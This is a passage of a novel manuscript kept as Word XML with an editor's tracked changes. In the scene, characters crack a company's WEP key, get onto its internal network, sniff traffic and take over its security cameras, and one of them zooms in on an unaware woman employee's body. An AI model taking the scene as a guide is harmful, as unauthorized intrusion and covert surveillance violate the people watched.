          </w:rPr>
          <w:delText>these machines</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> illuminate</w:t>
      </w:r>
      <w:del w:id="683" w:author="TextVet" w:date="2016-03-16T14:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00751ADD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>d</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the night with pure, glowing data.</w:t>
      </w:r>
      <w:commentRangeEnd w:id="680"/>
      <w:r w:rsidR="00751ADD">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="680"/>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light </w:t>
      </w:r>
      <w:ins w:id="684" w:author="TextVet" w:date="2016-03-16T14:12:00Z">
        <w:r w:rsidR="00586756">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>inked to blackness.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="685" w:author="TextVet" w:date="2016-03-16T14:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00586756">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>was suddenly obscured by</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Jason’s hand wav</w:t>
      </w:r>
      <w:ins w:id="686" w:author="TextVet" w:date="2016-03-16T14:13:00Z">
        <w:r w:rsidR="00586756">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="687" w:author="TextVet" w:date="2016-03-16T14:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00586756">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="688" w:author="TextVet" w:date="2016-03-16T14:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00586756">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and snapping its fingers in front</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="689" w:author="TextVet" w:date="2016-03-16T14:13:00Z">
        <w:r w:rsidR="00586756">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> again before</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="690" w:author="TextVet" w:date="2016-03-16T14:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00586756">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his face. “Helllooooo, Earth to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del w:id="691" w:author="TextVet" w:date="2016-03-16T14:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B611E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Huh? </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Wh</w:t>
      </w:r>
      <w:ins w:id="692" w:author="TextVet" w:date="2016-03-16T14:14:00Z">
        <w:r w:rsidR="008B611E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-wh</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">at?” Danny </w:t>
      </w:r>
      <w:ins w:id="693" w:author="TextVet" w:date="2016-03-16T14:14:00Z">
        <w:r w:rsidR="00F1032D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>smarted</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="694" w:author="TextVet" w:date="2016-03-16T14:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F1032D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>jumped to attention</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“Distracted by something shiny?”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“Yeah,” Danny replied. He looked at his laptop screen. “Sweet, I’ve got plenty of vectors. Now I just hit Analyze… Korek algorithm… Start… and…” He held up his computer, triumphant. “Gentlemen, we can </w:t>
      </w:r>
      <w:commentRangeStart w:id="695"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>haz</w:t>
      </w:r>
      <w:commentRangeEnd w:id="695"/>
      <w:r w:rsidR="00F84AF6">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="695"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> password!”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men leaned in to see Danny’s screen. The message “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>WEP key found !</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:ins w:id="696" w:author="TextVet" w:date="2016-03-16T14:16:00Z">
        <w:r w:rsidR="00A45CCA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> beaconed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="697" w:author="TextVet" w:date="2016-03-16T14:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A45CCA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> showed prominently</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:ins w:id="698" w:author="TextVet" w:date="2016-03-16T14:16:00Z">
        <w:r w:rsidR="00623523">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>E</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="699" w:author="TextVet" w:date="2016-03-16T14:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00623523">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>They e</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ach carefully copied the sequence to </w:t>
      </w:r>
      <w:ins w:id="700" w:author="TextVet" w:date="2016-03-16T14:16:00Z">
        <w:r w:rsidR="00623523">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>his</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="701" w:author="TextVet" w:date="2016-03-16T14:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00623523">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>their</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> own computer</w:t>
      </w:r>
      <w:del w:id="702" w:author="TextVet" w:date="2016-03-16T14:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00623523">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>6430637430725F505F66336C6C61746573…</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sitting behind Danny, announced, “It works. I’m connected.”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“Start scanning,” Danny directed. “Now that we’re behind their firewall, we should be able to reach every machine on their network.”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asked, “Do you want to see their camera feeds?”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Danny said. “You have video streams?”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“I have everything,” </w:t>
      </w:r>
      <w:ins w:id="703" w:author="TextVet" w:date="2016-03-16T14:18:00Z">
        <w:r w:rsidR="007B4C37">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">announced </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="704" w:author="TextVet" w:date="2016-03-16T14:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007B4C37">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Mike. “I’m doing a promiscuous packet sniff. Look at port 80 on 192.168.2.57. I’m seeing an MPEG-4 stream inside an HTTP session.”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Upon entering the numbers, Danny’s screen filled with a picture of the driveway in front of the Tungsten building. A narrow ribbon of text ran along the bottom, showing the current date and time. A rectangle labeled “PTZ” contained icons of arrows and magnifying glasses. Danny clicked on them and found that he could move the camera — pan, tilt, and zoom.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also seeing user activity,” Mike added. “There’s a chat session, and there’s a FireFox browser making requests to stuffonmycat.com. I’m pretty sure someone’s still in the building.”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“Any more video feeds?”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bunch,” said Mike. “Same subnet. Dot-84, dot-91, dot-95…”</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brought up each one. They were all video feeds from security cameras. He saw office hallways; conference rooms and cubicles with whiteboards covered with chemical formulas; laboratories full of beakers, refrigerators, and centrifuges; a large warehouse-like storage room filled with scientific and medical equipment.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saw the reception area. Somebody was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“Guys. Check out dot-177,”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screen showed an angled overhead view of a young woman at the reception desk. She wore a black knit cardigan over a simple white button-down shirt. Her unkempt black hair fell below her chin. A small nose stud glinted in the light.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Danny noticed most, though, was her posture and poise — or rather, her complete lack thereof. She slouched as she tapped away at her keyboard. The timing of her keystrokes made it obvious that she was chatting with someone online, feeling no need to appear like she was still working. Her hair was unkempt not because she was going for an artificial messy-chic look, but because it was, in fact, the natural state of her hair after a long work shift.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smiled. Her hair looked beautiful anyway.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Suddenly, the view on Danny’s screen panned to center on the girl.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“Hey! Who’s doing that?” barked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“Doing whaaaaat?” Moshen said from the back of the car.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“Quit playing with the PTZ buttons!”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vital reconnaissance work!” Moshen insisted.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looked at Danny’s screen. “Oh. That’s Christina. Their office admin.”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video feed zoomed in on her chest. Her shirt and cardigan took up the entire screen.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“Dude, stop that!” </w:t>
      </w:r>
      <w:del w:id="705" w:author="TextVet" w:date="2016-03-16T14:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF5AF1">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Danny</w:t>
      </w:r>
      <w:ins w:id="706" w:author="TextVet" w:date="2016-03-16T14:20:00Z">
        <w:r w:rsidR="00BF5AF1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> demanded;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="707" w:author="TextVet" w:date="2016-03-16T14:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF5AF1">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708" w:author="TextVet" w:date="2016-03-16T14:20:00Z">
        <w:r w:rsidR="00BF5AF1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="709" w:author="TextVet" w:date="2016-03-16T14:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF5AF1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> zoomed the camera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this is important! We’re here to examine Tungsten’s assets!” said Moshen. As the camera tightened back onto the young woman’s breasts, her torso turned. Her face descended into view, filling the frame. She looked straight into the camera with a perplexed squint, then craned toward the lens.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“Shit! Can she see me?” Moshen exclaimed, and rapidly zoomed back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self-consciously adjusted her cardigan and turned back to her computer.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“Quit dicking around!” Danny commanded.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“Okay, sorry,” said Moshen. “What’s next?”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we’re on their internal network. Next step is to get onto one of their computers. Right now, we’re like burglars who’ve broken into an apartment building and we’re loitering in the hallways. We haven’t actually gotten into any of the apartments yet. Mike, how’s that network scan coming?”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“This place is a goddamned mess,” Mike replied. “Their network topology makes absolutely no sense. It looks like they’ve got like a dozen network segments, and they seem to be connected completely at random. Normally, a corporate network is organized into groups of related computers, right? Like maybe a subnet for the Finance department, and then inside that, a subnet for Payroll and one for Accounts Receivable. That’s how we’re taught to do it at Bellevue. But this…? </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="710" w:author="TextVet" w:date="2016-03-16T14:22:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>This</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:del w:id="711" w:author="TextVet" w:date="2016-03-16T14:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00332FE3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">total </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>chaos. There’s no overall design to it. The sysadmin is either some kind of insane genius, or he just makes up the network structure as he goes along. Like he’s slapping it together out of parts that happen to be lying around.”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chuckled</w:t>
      </w:r>
      <w:del w:id="712" w:author="TextVet" w:date="2016-03-16T14:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C1E3E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> a bit</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “Not surprising. All </w:t>
      </w:r>
      <w:del w:id="713" w:author="TextVet" w:date="2016-03-16T14:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00657788">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">their network administration is handled by this </w:t>
      </w:r>
      <w:del w:id="714" w:author="TextVet" w:date="2016-03-16T14:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DE1B72">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">one </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Roger Tanner kid. You know what it’s like </w:t>
      </w:r>
      <w:del w:id="715" w:author="TextVet" w:date="2016-03-16T14:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00686E8C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>be</w:t>
      </w:r>
      <w:ins w:id="716" w:author="TextVet" w:date="2016-03-16T14:23:00Z">
        <w:r w:rsidR="00686E8C">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a company’s </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> IT guy?”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nodded his large, furry head. “Yeah, most of these machines seem really badly maintained. Some look like they’ve gone months without a patch or an upgrade.”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the back, Moshen grumbled</w:t>
      </w:r>
      <w:del w:id="717" w:author="TextVet" w:date="2016-03-16T14:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AC22D0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in displeasure</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Guys, call me paranoid, but I really don’t think that girl should be at her computer while we do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“What’s the big deal?” Danny asked. “You said she’s just chatting and surfing the web.”</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“If we want to take over her machine,” Moshen insisted, “then we don’t want her sitting there watching her screen while her cursor moves all by itself and her files start dragging and dropping.”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grunted </w:t>
      </w:r>
      <w:del w:id="718" w:author="TextVet" w:date="2016-03-16T14:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00267C0D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">in </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>agreement. “</w:t>
      </w:r>
      <w:del w:id="719" w:author="TextVet" w:date="2016-03-16T14:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00511028">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">I think </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="720" w:author="TextVet" w:date="2016-03-16T14:25:00Z">
        <w:r w:rsidR="00CD5CFF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>He</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="721" w:author="TextVet" w:date="2016-03-16T14:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CD5CFF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Moshen</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="722" w:author="TextVet" w:date="2016-03-16T14:25:00Z">
        <w:r w:rsidR="00511028">
          <w:rPr>
